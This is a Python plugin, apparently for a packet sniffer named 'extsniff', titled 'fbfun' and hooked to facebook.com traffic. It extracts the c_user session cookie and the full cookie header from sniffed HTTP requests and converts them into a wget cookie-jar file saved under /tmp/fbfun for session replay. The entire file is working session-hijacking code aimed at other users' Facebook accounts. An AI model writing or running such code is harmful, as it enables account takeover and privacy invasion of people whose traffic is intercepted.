# fbfun plugin for extsniff
L_HOOKS = dict()
G_HOOKS = dict()
L_HOOKS['url'] = 'facebook.com/'
L_HOOKS['module'] = 'facebook.hijackFacebook'
G_HOOKS['url'] = 'facebook.com/'
G_HOOKS['module'] = 'facebook.hijackFacebook'

def hijackFacebook(Headers, ipsrc='', hook='', pkt='', session=''):
    import os,re

    if Headers['headers'].has_key('cookie'):
        cookiename = re.findall("c_user=([0-9]+)", Headers['headers']['cookie'][0])

        if not cookiename:
            return "WARNING: Wrong c_user value for facebook: "+cookiename

        if not os.path.exists("/tmp/fbfun"):
            os.mkdir("/tmp/fbfun")

        # cookie was transsfered, lets save it for fun
        if not os.path.exists("/tmp/fbfun/"+cookiename[0]):
            fbfunCookie = open("/tmp/fbfun/"+cookiename[0], "w")
            wgetCookies = makeWgetFromHTTPCookies(Headers['headers']['cookie'][0])
            fbfunCookie.write(wgetCookies)
            fbfunCookie.close()

def makeWgetFromHTTPCookies(a):
    Domain = ".facebook.com"
    DefaultPath = "/"
    AllCookies = "" # RESULT
    CookieList = a.split(';');
    ElementID = 0
    CountOfCookies = len(CookieList)

    for Element in CookieList:
        ElementID = ElementID+1
        # STRIP NEW LINES
        Element = Element.replace("\n", "")

        while Element[0:1] == " ": # STRIP WHITE SPACES FROM BEGINNING OF STRING
            Element = Element[1:]

        CookieSyntax = Element.split("=");

        if len(CookieSyntax) > 0:
            SimpleCookieString = Domain+"	TRUE	"+DefaultPath+"	FALSE	0	"+CookieSyntax[0]+"	"
                

            # if the cookie is more complicated (too many "=")
            if len(CookieSyntax) > 2:
                for CookieSyntaxValue in CookieSyntax:
                    if CookieSyntaxValue == CookieSyntax[0]:
                        continue

                    SimpleCookieString=SimpleCookieString+"="+CookieSyntaxValue
            else:
                SimpleCookieString = SimpleCookieString+CookieSyntax[1] # for simple cookie its not complicated, it has "one value"

        if ElementID == CountOfCookies:
            AllCookies = AllCookies+SimpleCookieString
        else:
            AllCookies = AllCookies+SimpleCookieString+"\n"

    return AllCookies
        
